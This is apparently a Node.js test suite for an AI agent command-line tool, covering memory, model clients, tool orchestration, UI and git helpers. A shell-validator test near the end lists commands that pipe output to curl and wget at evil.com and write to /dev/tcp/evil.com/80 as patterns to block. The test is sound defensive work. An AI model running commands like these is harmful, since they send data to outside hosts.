import test from 'node:test';
import assert from 'node:assert/strict';
import os from 'node:os';
import path from 'node:path';
import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { runEditAgent } from '../src/agent/edit-loop.js';
import { partitionTools, executeToolBatch, executeToolsSequential } from '../src/agent/orchestration.js';
import { McpManager } from '../src/tools/mcp-client.js';
import { Mascot, createBubble, selectSpecies } from '../src/ui/mascot.js';
import { StreamBatcher } from '../src/utils/stream.js';
import {
  buildChatSystemPrompt,
  compactConversationIfNeeded,
  updateMemoryAfterTurn
} from '../src/memory/manager.js';
import { inferLocalMemory, resolveLocalChatShortcut } from '../src/memory/heuristics.js';
import { extractProfileFromText, mergeMemoryExtractions } from '../src/memory/ingest.js';
import { createMemoryStore, loadMemoryState, mergeMemoryExtraction } from '../src/memory/store.js';
import { buildPermissionGuide } from '../src/system/permissions.js';
import { loadSkills, selectRelevantSkills } from '../src/skills/loader.js';
import { extractFirstJsonObject } from '../src/utils/json.js';
import {
  buildWorkspaceOverview,
  findRelevantFiles,
  scanWorkspace
} from '../src/workspace/indexer.js';
import { listFiles, readIndexedFile, searchText } from '../src/workspace/queries.js';
import { OpenAICompatibleClient } from '../src/model/openai-compatible.js';
import { OllamaClient } from '../src/model/ollama.js';

function createChunkStream(chunks) {
  return new ReadableStream({
    start(controller) {
      for (const chunk of chunks) {
        controller.enqueue(new TextEncoder().encode(chunk));
      }
      controller.close();
    }
  });
}

test('extractFirstJsonObject reads fenced json', () => {
  const parsed = extractFirstJsonObject('```json\n{"type":"final","summary":"ok"}\n```');
  assert.equal(parsed.type, 'final');
  assert.equal(parsed.summary, 'ok');
});

test('workspace scanner loads text files and supports queries', async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'agent-cli-'));
  await writeFile(path.join(tempRoot, 'app.ts'), 'export function add(a, b) {\n  return a + b;\n}\n');
  await writeFile(path.join(tempRoot, 'README.md'), '# Demo\n');

  const index = await scanWorkspace(tempRoot, {
    ignore: [],
    maxFileBytes: 1024 * 1024,
    maxWorkspaceBytes: 1024 * 1024
  });

  assert.equal(index.stats.totalFiles, 2);
  assert.equal(listFiles(index, { pattern: '**' }).length, 2);
  assert.equal(searchText(index, { query: 'return a + b' }).length, 1);
  assert.match(readIndexedFile(index, 'app.ts').content, /return a \+ b/);
});

test('edit agent can drive tool loop and modify files', async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'agent-cli-edit-'));
  const targetFile = path.join(tempRoot, 'index.js');
  await writeFile(targetFile, 'export const value = "old";\n');

  const index = await scanWorkspace(tempRoot, {
    ignore: [],
    maxFileBytes: 1024 * 1024,
    maxWorkspaceBytes: 1024 * 1024
  });

  const replies = [
    JSON.stringify({
      type: 'tool',
      tool: 'replace_in_file',
      args: {
        path: 'index.js',
        oldText: '"old"',
        newText: '"new"'
      }
    }),
    JSON.stringify({
      type: 'final',
      summary: 'updated file',
      changedFiles: ['index.js'],
      notes: []
    })
  ];

  let callCount = 0;
  const fakeClient = {
    async generateText() {
      const reply = replies[callCount];
      callCount += 1;
      return reply;
    }
  };

  const relevantFiles = findRelevantFiles(index, 'replace old with new');
  const result = await runEditAgent({
    client: fakeClient,
    index,
    workspaceOverview: buildWorkspaceOverview(index),
    relevantFiles,
    task: 'replace old with new',
    maxSteps: 4
  });

  const content = await readFile(targetFile, 'utf8');
  assert.match(content, /"new"/);
  assert.equal(result.summary, 'updated file');
});

test('memory store persists profile and durable memories', async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'agent-cli-memory-'));
  const configPath = path.join(tempRoot, 'config.json');
  await writeFile(configPath, '{}\n');

  const store = await createMemoryStore({
    configPath,
    workspaceRoot: tempRoot,
    sessionName: 'demo'
  });
  const state = await loadMemoryState(store, {
    memory: {
      enabled: true,
      autoExtract: true,
      maxDurableMemories: 80
    },
    conversation: {
      keepRecentMessages: 12,
      summarizeAfterMessages: 18,
      maxSummaryChars: 6000
    }
  });

  const fakeClient = {
    async generateText({ systemPrompt }) {
      if (String(systemPrompt).includes('长期记忆提取器')) {
        return JSON.stringify({
          profilePatch: {
            language: 'zh-CN',
            goals: ['构建更强的 AI Agent CLI']
          },
          durableMemories: [
            {
              category: 'goal',
              content: '用户希望 Frees Agent 支持更强的记忆和长对话。'
            }
          ]
        });
      }
      return '{}';
    }
  };

  await updateMemoryAfterTurn({
    client: fakeClient,
    state,
    userMessage: '请帮我把 Frees Agent 做得更强，最好支持超长对话和记忆。',
    assistantMessage: '好的，我会为你增强记忆和长对话。',
    config: state.config
  });

  const reloaded = await loadMemoryState(store, state.config);
  assert.equal(reloaded.profile.language, 'zh-CN');
  assert.match(reloaded.durableMemories[0].content, /长对话/);
});

test('conversation compaction builds session summary', async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'agent-cli-summary-'));
  const configPath = path.join(tempRoot, 'config.json');
  await writeFile(configPath, '{}\n');

  const store = await createMemoryStore({
    configPath,
    workspaceRoot: tempRoot,
    sessionName: 'summary'
  });
  const state = await loadMemoryState(store, {
    memory: {
      enabled: true,
      autoExtract: false
    },
    conversation: {
      keepRecentMessages: 4,
      summarizeAfterMessages: 6,
      maxSummaryChars: 6000
    }
  });

  for (let index = 0; index < 8; index += 1) {
    state.session.recentMessages.push({
      role: index % 2 === 0 ? 'user' : 'assistant',
      content: `message-${index}`,
      timestamp: new Date().toISOString()
    });
  }

  const fakeClient = {
    async generateText() {
      return JSON.stringify({
        summary: '用户正在增强 Frees Agent，并讨论了记忆与超长对话。',
        keyFacts: ['要支持持久化记忆', '要支持长对话摘要'],
        openLoops: ['继续完善文档']
      });
    }
  };

  await compactConversationIfNeeded({
    client: fakeClient,
    state,
    config: state.config
  });

  assert.match(state.session.summary, /持久化记忆/);
  assert.equal(state.session.recentMessages.length, 4);
});

test('chat system prompt includes memory context', async () => {
  const prompt = buildChatSystemPrompt({
    baseSystemPrompt: 'base',
    state: {
      profile: { language: 'zh-CN' },
      durableMemories: [{ category: 'goal', content: '构建 Frees Agent' }],
      session: { summary: '之前已经讨论过记忆系统。' }
    },
    config: {
      memory: {
        enabled: true,
        includeUserProfile: true,
        includeDurableMemories: true
      }
    }
  });

  assert.match(prompt, /画像/);
  assert.match(prompt, /记忆/);
  assert.match(prompt, /摘要/);
});

test('permission guide returns platform-aware content', () => {
  const guide = buildPermissionGuide();
  assert.ok(guide.platform);
  assert.ok(Array.isArray(guide.steps));
  assert.ok(guide.steps.length >= 1);
});

test('local chat shortcut remembers and returns user name', () => {
  const reply = resolveLocalChatShortcut('我叫什么名字', {
    profile: { name: 'Frees Ling' }
  });
  assert.equal(reply, '你叫 Frees Ling。');
});

test('name questions are not extracted as user names', () => {
  const extraction = inferLocalMemory('你知道我叫什么名字吗');
  assert.equal(extraction.profilePatch.name, undefined);
});

test('profile extractor captures stack and skills', () => {
  const patch = extractProfileFromText(
    '我的技术栈是 Rust, TypeScript。我也会 Python开发，目标是做一个 AI Agent。'
  );
  assert.ok(patch.stack.includes('Rust'));
  assert.ok(patch.skills.includes('Python'));
  assert.ok(patch.goals.some(item => item.includes('做一个 AI Agent')));
});

test('memory extraction merge normalizes profile-like durable entries', () => {
  const merged = mergeMemoryExtractions({
    profilePatch: {},
    durableMemories: [
      { category: 'skill', content: 'Python开发' },
      { category: 'skill', content: 'Python 编程' },
      { category: 'goal', content: '构建 Frees Agent' }
    ]
  });

  assert.equal(merged.profilePatch.skills.length, 1);
  assert.equal(merged.profilePatch.skills[0], 'Python');
  assert.equal(merged.durableMemories.length, 1);
});

test('self introduction gets an immediate local reply', () => {
  const reply = resolveLocalChatShortcut('我叫 Frees Ling，很高兴认识你！', {
    profile: {}
  });
  assert.equal(reply, '你好，Frees Ling。很高兴认识你，我已经记住你的名字了。');
});

test('invalid extracted names are ignored during merge', () => {
  const state = {
    profile: {},
    durableMemories: [],
    session: {}
  };

  mergeMemoryExtraction(
    state,
    {
      profilePatch: {
        name: '什么名字吗'
      }
    },
    {
      memory: {
        maxDurableMemories: 10
      }
    }
  );

  assert.equal(state.profile.name, undefined);
  assert.equal(state.durableMemories.length, 0);
});

test('loading memory state sanitizes previously broken name data', async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'agent-cli-memory-sanitize-'));
  const configPath = path.join(tempRoot, 'config.json');
  await writeFile(configPath, '{}\n');

  const store = await createMemoryStore({
    configPath,
    workspaceRoot: tempRoot,
    sessionName: 'sanitize'
  });

  await writeFile(
    store.memoryPath,
    `${JSON.stringify({
      version: 2,
      profile: { name: '什么名字吗', language: 'zh-CN' },
      durableMemories: [
        { category: 'profile', content: '用户的名字是 什么名字吗。' },
        { category: 'goal', content: '用户想增强 Frees Agent。' }
      ],
      tasks: [],
      conversations: {
        currentSession: null,
        recentMessages: [],
        summary: ''
      },
      updatedAt: new Date().toISOString()
    }, null, 2)}\n`
  );

  const state = await loadMemoryState(store, {
    memory: {
      enabled: true,
      autoExtract: true,
      maxDurableMemories: 80
    },
    conversation: {
      keepRecentMessages: 12,
      summarizeAfterMessages: 18,
      maxSummaryChars: 6000
    }
  });

  assert.equal(state.profile.name, undefined);
  assert.equal(state.profile.language, 'zh-CN');
  assert.equal(state.durableMemories.length, 1);
  assert.match(state.durableMemories[0].content, /增强 Frees Agent/);
});

test('skills loader reads SKILL.md files and matches relevant skills', async () => {
  const tempRoot = await mkdtemp(path.join(os.tmpdir(), 'agent-cli-skills-'));
  const skillDir = path.join(tempRoot, '.claude', 'skills', 'code-review');
  await import('node:fs/promises').then(module =>
    module.mkdir(skillDir, { recursive: true })
  );
  await writeFile(
    path.join(skillDir, 'SKILL.md'),
    `---\nname: Code Review\ndescription: Review code for bugs and missing tests.\nallowed-tools: Read, Grep\n---\n\n# Code Review\n`
  );

  const skills = await loadSkills(tempRoot);
  assert.ok(skills.some(skill => skill.slug === 'code-review'));

  const matched = selectRelevantSkills(skills, '请帮我 review 代码并找 bug');
  assert.ok(matched.some(skill => skill.slug === 'code-review'));
});

test('openai-compatible streamText emits incremental tokens', async () => {
  const originalFetch = global.fetch;
  global.fetch = async () =>
    new Response(
      createChunkStream([
        'data: {"choices":[{"delta":{"content":"你"}}]}\n\n',
        'data: {"choices":[{"delta":{"content":"好"}}]}\n\n',
        'data: [DONE]\n\n'
      ]),
      {
        status: 200,
        headers: {
          'content-type': 'text/event-stream'
        }
      }
    );

  try {
    const client = new OpenAICompatibleClient({
      baseUrl: 'http://127.0.0.1:1234/v1',
      model: 'demo-model'
    });

    let streamed = '';
    const reply = await client.streamText({
      systemPrompt: 'test',
      messages: [{ role: 'user', content: 'hi' }],
      onToken(token) {
        streamed += token;
      }
    });

    assert.equal(reply, '你好');
    assert.equal(streamed, '你好');
  } finally {
    global.fetch = originalFetch;
  }
});

test('openai-compatible qwen generateText disables thinking and strips think block', async () => {
  const originalFetch = global.fetch;
  let requestBody;
  global.fetch = async (_url, init = {}) => {
    requestBody = JSON.parse(String(init.body || '{}'));
    return new Response(
      JSON.stringify({
        choices: [
          {
            message: {
              content: '<think>internal</think>你好'
            }
          }
        ]
      }),
      {
        status: 200,
        headers: {
          'content-type': 'application/json'
        }
      }
    );
  };

  try {
    const client = new OpenAICompatibleClient({
      baseUrl: 'http://127.0.0.1:1234/v1',
      model: 'qwen/qwen3.6-27b'
    });

    const reply = await client.generateText({
      systemPrompt: 'test',
      messages: [{ role: 'user', content: 'hi' }]
    });

    assert.equal(reply, '你好');
    assert.equal(requestBody.chat_template_kwargs.enable_thinking, false);
  } finally {
    global.fetch = originalFetch;
  }
});

test('openai-compatible qwen streamText sends disable-thinking flag', async () => {
  const originalFetch = global.fetch;
  let requestBody;
  global.fetch = async (_url, init = {}) => {
    requestBody = JSON.parse(String(init.body || '{}'));
    return new Response(
      createChunkStream(['data: {"choices":[{"delta":{"content":"你好"}}]}\n\n', 'data: [DONE]\n\n']),
      {
        status: 200,
        headers: {
          'content-type': 'text/event-stream'
        }
      }
    );
  };

  try {
    const client = new OpenAICompatibleClient({
      baseUrl: 'http://127.0.0.1:1234/v1',
      model: 'qwen3'
    });

    const reply = await client.streamText({
      systemPrompt: 'test',
      messages: [{ role: 'user', content: 'hi' }]
    });

    assert.equal(reply, '你好');
    assert.equal(requestBody.chat_template_kwargs.enable_thinking, false);
  } finally {
    global.fetch = originalFetch;
  }
});

test('ollama streamText emits incremental tokens', async () => {
  const originalFetch = global.fetch;
  global.fetch = async () =>
    new Response(
      createChunkStream([
        '{"message":{"content":"Hel"}}\n',
        '{"message":{"content":"lo"}}\n',
        '{"done":true}\n'
      ]),
      {
        status: 200,
        headers: {
          'content-type': 'application/x-ndjson'
        }
      }
    );

  try {
    const client = new OllamaClient({
      baseUrl: 'http://127.0.0.1:11434',
      model: 'demo-model'
    });

    let streamed = '';
    const reply = await client.streamText({
      systemPrompt: 'test',
      messages: [{ role: 'user', content: 'hi' }],
      onToken(token) {
        streamed += token;
      }
    });

    assert.equal(reply, 'Hello');
    assert.equal(streamed, 'Hello');
  } finally {
    global.fetch = originalFetch;
  }
});

test('tool orchestration partitions read-only vs write tools', () => {
  const { concurrent, sequential } = partitionTools([
    { name: 'list_files', args: {} },
    { name: 'write_file', args: { path: 'test.txt', content: 'hello' } },
    { name: 'read_file', args: { path: 'test.txt' } },
    { name: 'delete_file', args: { path: 'test.txt' } }
  ]);

  assert.equal(concurrent.length, 2);
  assert.equal(sequential.length, 2);
  assert.equal(concurrent[0].name, 'list_files');
  assert.equal(concurrent[1].name, 'read_file');
  assert.equal(sequential[0].name, 'write_file');
  assert.equal(sequential[1].name, 'delete_file');
});

test('tool orchestration executes concurrent batch', async () => {
  const executed = [];
  const runToolFn = async (name) => {
    executed.push(name);
    return { success: true };
  };

  await executeToolBatch([
    { name: 'read_file', args: { path: 'a.txt' } },
    { name: 'read_file', args: { path: 'b.txt' } }
  ], runToolFn);

  assert.equal(executed.length, 2);
  assert.ok(executed.includes('read_file'));
});

test('partitionTools treats mcp tools as concurrent', () => {
  const { concurrent, sequential } = partitionTools([
    { name: 'mcp__server__search', args: { query: 'test' } },
    { name: 'write_file', args: { path: 'test.txt', content: '' } }
  ]);

  assert.equal(concurrent.length, 1);
  assert.equal(concurrent[0].name, 'mcp__server__search');
  assert.equal(sequential.length, 1);
  assert.equal(sequential[0].name, 'write_file');
});

test('executeToolsSequential runs tools one by one', async () => {
  const order = [];
  const runToolFn = async (name) => {
    order.push(name);
    return { ok: true };
  };

  await executeToolsSequential([
    { name: 'first', args: {} },
    { name: 'second', args: {} }
  ], runToolFn);

  assert.equal(order.length, 2);
  assert.equal(order[0], 'first');
  assert.equal(order[1], 'second');
});

test('McpManager handles empty config', async () => {
  const manager = new McpManager({ config: {}, storageRoot: '/tmp' });
  const tools = await manager.listAllTools();
  assert.equal(tools.length, 0);
});

test('McpManager throws for unknown server', async () => {
  const manager = new McpManager({ config: {}, storageRoot: '/tmp' });
  await assert.rejects(
    () => manager.getOrConnect('nonexistent'),
    /MCP 服务器未配置/
  );
});

test('expandEnvVars replaces patterns', async () => {
  const { expandEnvVars } = await import('../src/config.js');
  process.env.TEST_VAR = 'test-value';
  const result = expandEnvVars('hello ${TEST_VAR} world');
  assert.equal(result, 'hello test-value world');
  delete process.env.TEST_VAR;
});

test('McpManager disconnectAll handles empty state', async () => {
  const manager = new McpManager({ config: {}, storageRoot: '/tmp' });
  await manager.disconnectAll();
  assert.ok(true);
});

test('Mascot creates with default species', () => {
  const mascot = new Mascot({});
  assert.equal(mascot.species, 'cat');
  assert.ok(mascot.sprites.length >= 3);
});

test('Mascot renders specified species', () => {
  const mascot = new Mascot({ species: 'penguin' });
  assert.equal(mascot.species, 'penguin');
  const lines = mascot.render(0);
  assert.equal(lines.length, 5);
});

test('Mascot has greetings and reactions', () => {
  const mascot = new Mascot({ species: 'cat' });
  const greeting = mascot.getGreeting();
  assert.ok(greeting.length > 0);
  const thinking = mascot.getThinkingReaction();
  assert.ok(thinking.length > 0);
  const happy = mascot.getHappyReaction();
  assert.ok(happy.length > 0);
  const confused = mascot.getConfusedReaction();
  assert.ok(confused.length > 0);
});

test('Mascot color property returns ANSI code', () => {
  const mascot = new Mascot({ species: 'dragon' });
  assert.match(mascot.color, /\x1b\[/);
});

test('createBubble wraps text and formats bubble shape', () => {
  const bubble = createBubble('Hello World', { maxWidth: 30 });
  assert.ok(bubble.length >= 3);
  assert.match(bubble[0], /╭/);
  assert.match(bubble[bubble.length - 1], /╰/);
});

test('selectSpecies returns valid species name', () => {
  const species = selectSpecies('test-user');
  const valid = ['cat', 'penguin', 'rabbit', 'ghost', 'dragon', 'owl'];
  assert.ok(valid.includes(species));
});

test('selectSpecies is deterministic', () => {
  const a = selectSpecies('same-user');
  const b = selectSpecies('same-user');
  assert.equal(a, b);
});

test('StreamBatcher buffers and flushes tokens', async () => {
  const flushed = [];
  const batcher = new StreamBatcher({
    onFlush(chunk) { flushed.push(chunk); },
    intervalMs: 20,
    maxSize: 100
  });

  batcher.write('Hel');
  batcher.write('lo');
  batcher.write(' World');

  // Wait for flush timer
  await new Promise(r => setTimeout(r, 50));

  assert.equal(flushed.length, 1);
  assert.equal(flushed[0], 'Hello World');

  batcher.destroy();
});

test('StreamBatcher flushes on maxSize exceeded', async () => {
  const flushed = [];
  const batcher = new StreamBatcher({
    onFlush(chunk) { flushed.push(chunk); },
    intervalMs: 100,
    maxSize: 10
  });

  batcher.write('this is a long text that exceeds max size');
  // Should flush immediately due to maxSize

  await new Promise(r => setTimeout(r, 30));

  assert.ok(flushed.length >= 1);
  assert.ok(flushed[0].length >= 10);

  batcher.destroy();
});

test('StreamBatcher end flushes remaining buffer', () => {
  const flushed = [];
  const batcher = new StreamBatcher({
    onFlush(chunk) { flushed.push(chunk); },
    intervalMs: 1000
  });

  batcher.write('test');
  batcher.end();

  assert.equal(flushed.length, 1);
  assert.equal(flushed[0], 'test');
});

test('StreamBatcher destroy clears buffer', () => {
  const flushed = [];
  const batcher = new StreamBatcher({
    onFlush(chunk) { flushed.push(chunk); },
    intervalMs: 50
  });

  batcher.write('data');
  batcher.destroy();

  assert.equal(flushed.length, 0);
});

test('Mascot species rendering produces different outputs', () => {
  const cat = new Mascot({ species: 'cat' });
  const penguin = new Mascot({ species: 'penguin' });
  const catFrame = cat.render(0);
  const penguinFrame = penguin.render(0);
  // Different species should have different art
  assert.notDeepEqual(catFrame, penguinFrame);
});

// --- Phase 4: Theme & Display Tools ---

test('theme provides dark and light variants', async () => {
  const { getTheme, getThemeNames, themeColorToAnsi, applyTheme } = await import('../src/utils/theme.js');

  const dark = getTheme('dark');
  assert.equal(typeof dark.text, 'string');
  assert.match(dark.text, /rgb\(/);

  const light = getTheme('light');
  assert.equal(typeof light.text, 'string');

  // default to dark for unknown theme
  assert.deepEqual(getTheme('nonexistent'), dark);

  const names = getThemeNames();
  assert.ok(names.includes('dark'));
  assert.ok(names.includes('light'));
  assert.ok(names.includes('dark-ansi'));
  assert.ok(names.includes('light-ansi'));

  // themeColorToAnsi
  const ansi = themeColorToAnsi(dark.claude);
  assert.ok(ansi.startsWith('\x1b['));
  assert.ok(ansi.includes('38;2'));

  // ANSI theme color
  const ansiColor = themeColorToAnsi('ansi:red');
  assert.equal(ansiColor, '\x1b[31m');
  const ansiBright = themeColorToAnsi('ansi:redBright');
  assert.equal(ansiBright, '\x1b[91m');

  // applyTheme
  const colored = applyTheme('hello', 'success', 'dark');
  assert.ok(colored.includes('hello'));
  assert.ok(colored.includes('\x1b['));
  assert.ok(colored.includes('\x1b[0m'));
});

test('stringWidth measures CJK and ASCII', async () => {
  const { stringWidth } = await import('../src/utils/truncate.js');

  assert.equal(stringWidth('abc'), 3);
  assert.equal(stringWidth('你好'), 4);
  assert.equal(stringWidth(''), 0);
  // ANSI codes stripped
  assert.equal(stringWidth('\x1b[31mhello\x1b[0m'), 5);
  // Mixed
  assert.equal(stringWidth('a你b好c'), 7);
});

test('truncation functions handle edge cases', async () => {
  const mod = await import('../src/utils/truncate.js');

  // truncateToWidth
  assert.equal(mod.truncateToWidth('hello', 10), 'hello');
  assert.equal(mod.truncateToWidth('hello world', 5), 'hell…');
  assert.equal(mod.truncateToWidth('hello', 1), '…');
  assert.equal(mod.truncateToWidth('hello', 0), '…');

  // truncatePathMiddle
  const longPath = 'src/components/deeply/nested/folder/MyComponent.tsx';
  assert.equal(mod.truncatePathMiddle(longPath, 200), longPath);
  const truncated = mod.truncatePathMiddle(longPath, 30);
  assert.ok(truncated.length < longPath.length);
  assert.ok(truncated.includes('…'));
  assert.ok(truncated.endsWith('MyComponent.tsx'));
  assert.equal(mod.truncatePathMiddle('short.ts', 20), 'short.ts');

  // truncate (with singleLine)
  assert.equal(mod.truncate('hello\nworld', 20, true), 'hello…');
  assert.equal(mod.truncate('hello\nworld', 3, true), 'he…');
  assert.equal(mod.truncate('hello', 20), 'hello');

  // wrapText
  const lines = mod.wrapText('hello world foo bar', 10);
  assert.ok(lines.length >= 2);
  assert.ok(lines.every(l => l.length <= 11)); // approximate
});

test('treeify renders nested structures', async () => {
  const { treeify } = await import('../src/utils/treeify.js');

  const obj = { name: 'test', value: 42 };
  const result = treeify(obj);
  assert.ok(result.includes('name'));
  assert.ok(result.includes('42'));
  assert.ok(result.includes('├') || result.includes('└'));

  // empty object
  assert.equal(treeify({}), '(empty)');

  // nested — use multi-key root so continuation uses '│'
  const nested = { a: { x: 1, y: 2 }, b: { c: 1 } };
  const nestedResult = treeify(nested);
  assert.ok(nestedResult.includes('│'));
  assert.ok(nestedResult.includes('├'));
  assert.ok(nestedResult.includes('└'));

  // circular reference
  const circ = { x: 1 };
  circ.self = circ;
  const circResult = treeify(circ);
  assert.ok(circResult.includes('[Circular]'));

  // array value
  const arr = { items: [1, 2, 3] };
  const arrResult = treeify(arr);
  assert.ok(arrResult.includes('Array(3)'));

  // functions
  const func = { fn: () => {} };
  const funcResult = treeify(func, { showValues: true });
  assert.ok(funcResult.includes('[Function]'));

  // hideFunctions
  const hiddenResult = treeify(func, { hideFunctions: true });
  assert.ok(!hiddenResult.includes('[Function]'));
});

// --- Phase 6: Ultraplan Keywords ---

test('hasUltraplanKeyword detects keyword', async () => {
  const { hasUltraplanKeyword, findUltraplanTriggerPositions, replaceUltraplanKeyword } =
    await import('../src/utils/ultraplan/keyword.js');

  // Basic detection
  assert.ok(hasUltraplanKeyword('ultraplan this task'));
  assert.ok(!hasUltraplanKeyword('plan this task'));
  assert.ok(!hasUltraplanKeyword(''));

  // Case insensitive
  assert.ok(hasUltraplanKeyword('Ultraplan this'));
  assert.ok(hasUltraplanKeyword('ULTRAPLAN'));

  // Within quotes — should NOT trigger
  assert.ok(!hasUltraplanKeyword('"ultraplan" is a feature'));
  assert.ok(!hasUltraplanKeyword('`ultraplan` command'));
  assert.ok(!hasUltraplanKeyword("'ultraplan' mode"));

  // Path context — should NOT trigger
  assert.ok(!hasUltraplanKeyword('src/ultraplan/foo.ts'));
  assert.ok(!hasUltraplanKeyword('--ultraplan-mode'));
  assert.ok(!hasUltraplanKeyword('ultraplan.tsx'));

  // Followed by ? — should NOT trigger
  assert.ok(!hasUltraplanKeyword('what is ultraplan?'));

  // Slash command — should NOT trigger
  assert.ok(!hasUltraplanKeyword('/ultraplan help'));

  // findUltraplanTriggerPositions
  const positions = findUltraplanTriggerPositions('please ultraplan this');
  assert.equal(positions.length, 1);
  assert.equal(positions[0].word, 'ultraplan');
  assert.equal(positions[0].start, 7);

  // replaceUltraplanKeyword
  assert.equal(replaceUltraplanKeyword('ultraplan this'), 'plan this');
  assert.equal(replaceUltraplanKeyword('Please ultraplan it'), 'Please plan it');
  assert.equal(replaceUltraplanKeyword('no keyword'), 'no keyword');

  // Edge: only the keyword
  assert.equal(replaceUltraplanKeyword('ultraplan'), '');
});

test('ultraplan enhances buildExecutionPlan detection', async () => {
  const { hasUltraplanKeyword } = await import('../src/utils/ultraplan/keyword.js');
  const m = await import('../src/agent/reasoning.js');

  assert.equal(typeof m.buildExecutionPlan, 'function');
  assert.ok(hasUltraplanKeyword('ultraplan this task'));
});

// ---- Git utilities ----

test('git findGitRoot walks up to .git directory', async () => {
  const { findGitRoot, findCanonicalGitRoot, getIsGit, isAtGitRoot, isValidGitSha } = await import('../src/utils/git.js');

  const root = findGitRoot(process.cwd());
  assert.ok(root);
  assert.ok(root.endsWith('Frees-Agent') || root.endsWith('Frees-Agent/'), `expected Frees-Agent root, got ${root}`);

  assert.ok(getIsGit(process.cwd()));
  assert.ok(!isValidGitSha('bad'));
  assert.ok(isValidGitSha('a'.repeat(40)));
  assert.ok(isValidGitSha('b'.repeat(64)));

  const canonical = findCanonicalGitRoot(process.cwd());
  assert.ok(canonical);
});

test('git normalizeGitRemoteUrl handles ssh and https formats', async () => {
  const { normalizeGitRemoteUrl } = await import('../src/utils/git.js');

  const ssh = 'git@github.com:owner/repo.git';
  assert.equal(normalizeGitRemoteUrl(ssh), 'github.com/owner/repo');

  const https = 'https://github.com/owner/repo.git';
  assert.equal(normalizeGitRemoteUrl(https), 'github.com/owner/repo');

  const noGit = 'git@github.com:owner/repo';
  assert.equal(normalizeGitRemoteUrl(noGit), 'github.com/owner/repo');

  const empty = '';
  assert.equal(normalizeGitRemoteUrl(empty), null);

  const nullVal = null;
  assert.equal(normalizeGitRemoteUrl(nullVal), null);
  assert.equal(normalizeGitRemoteUrl(undefined), null);
});

test('git getBranch and getHead return current state', async () => {
  const { getBranch, getHead, getRemoteUrl, getIsClean } = await import('../src/utils/git.js');

  const branch = await getBranch();
  assert.ok(branch, 'should have a branch');

  const head = await getHead();
  assert.ok(head);
  assert.match(head, /^[0-9a-f]{40}$/);

  const url = await getRemoteUrl();
  assert.ok(url);
  assert.ok(url.includes('github.com') || url.includes('Frees-Ling'));
});

test('git getGitState returns comprehensive repo info', async () => {
  const { getGitState, getChangedFiles } = await import('../src/utils/git.js');

  const state = await getGitState();
  assert.ok(state);
  assert.ok(state.repoRoot);
  assert.ok(state.branch);
  assert.ok(state.head);
  assert.match(state.head, /^[0-9a-f]{40}$/);

  const files = await getChangedFiles();
  assert.ok(Array.isArray(files));
});

test('slug generator produces valid slugs', async () => {
  const { generateWordSlug, generateShortWordSlug } = await import('../src/utils/slug.js');

  const full = generateWordSlug();
  assert.ok(full.length > 0);
  assert.ok(full.includes('-'));

  const parts = full.split('-');
  assert.equal(parts.length, 3, 'full slug should have 3 parts');

  const short = generateShortWordSlug();
  assert.ok(short.includes('-'));
  assert.equal(short.split('-').length, 2, 'short slug should have 2 parts');
});

test('file utilities detect binary and text files correctly', async () => {
  const { isProbablyTextFile, formatBytes } = await import('../src/utils/files.js');

  // Known binary extensions
  const pngResult = isProbablyTextFile('image.png', Buffer.from([137, 80, 78, 71]));
  assert.ok(!pngResult, 'PNG should be detected as binary');

  const exeResult = isProbablyTextFile('app.exe', Buffer.from([77, 90]));
  assert.ok(!exeResult, 'EXE should be detected as binary');

  // Known text extensions
  const jsResult = isProbablyTextFile('file.js', Buffer.from('hello world'));
  assert.ok(jsResult, 'JS file should be detected as text');

  const pyResult = isProbablyTextFile('file.py', Buffer.from('print("hello")'));
  assert.ok(pyResult, 'Python file should be detected as text');

  // formatBytes
  assert.equal(formatBytes(500), '500 B');
  assert.equal(formatBytes(2048), '2.0 KB');
  assert.equal(formatBytes(1048576), '1.0 MB');
});

test('readIndexedFile returns enhanced file info', async () => {
  const { scanWorkspace } = await import('../src/workspace/indexer.js');
  const { readIndexedFile } = await import('../src/workspace/queries.js');

  // Scan only src/utils/ to stay within budget
  const index = await scanWorkspace('src/utils', { maxFileBytes: 5 * 1024 * 1024 });
  assert.ok(index.files.length > 0);

  const result = readIndexedFile(index, 'files.js', { startLine: 1, endLine: 3 });
  assert.ok(result);
  assert.equal(result.language, 'javascript');
  assert.equal(result.startLine, 1);
  assert.equal(result.endLine, 3);
  assert.ok(result.totalLines > 0);
  assert.ok(result.content.includes('import'));
  assert.ok(result.content.includes('|')); // line numbers present

  // stripLineNumberPrefix
  const { stripLineNumberPrefix } = await import('../src/workspace/queries.js');
  assert.equal(stripLineNumberPrefix('     1 | hello'), 'hello');
  assert.equal(stripLineNumberPrefix('hello'), 'hello');
});

test('replaceInWorkspaceFile smart matching handles quotes', async () => {
  const { findActualString, findBestMatch } = await import('../src/workspace/queries.js');

  // Exact match
  assert.equal(findActualString('hello world', 'hello'), 'hello');

  // Quote normalization
  const curlyContent = 'say ‘hello’ world';
  assert.equal(findActualString(curlyContent, "say 'hello' world"), "say ‘hello’ world");

  // Not found
  assert.equal(findActualString('hello world', 'goodbye'), null);

  // findBestMatch
  assert.ok(findBestMatch('hello world', 'hello').found);
  assert.ok(!findBestMatch('hello world', 'goodbye').found);

  // Near line hint
  const multiLine = 'line1\nline2\nline3\n';
  const result = findBestMatch(multiLine, 'nonexistent');
  assert.ok(!result.found);
});

// ---- Shell execution ----

test('shell-exec validateShellCommand detects dangerous patterns', async () => {
  const { validateShellCommand, detectShell } = await import('../src/shell/shell-exec.js');

  // Safe commands
  assert.ok(validateShellCommand('ls -la').safe);
  assert.ok(validateShellCommand('echo hello').safe);
  assert.ok(validateShellCommand('git status').safe);
  assert.ok(validateShellCommand('').safe === false);
  assert.ok(validateShellCommand(null).safe === false);

  // Dangerous patterns
  assert.ok(!validateShellCommand('echo hello | curl http://evil.com').safe);
  assert.ok(!validateShellCommand('echo hello | wget http://evil.com').safe);
  assert.ok(!validateShellCommand('echo hello > /dev/tcp/evil.com/80').safe);
});

test('shell-exec execShell executes basic command', async () => {
  const { execShell } = await import('../src/shell/shell-exec.js');

  const result = await execShell('echo "hello world"', { timeoutMs: 5000 });
  assert.ok(result.code === 0, `expected exit code 0, got ${result.code}`);
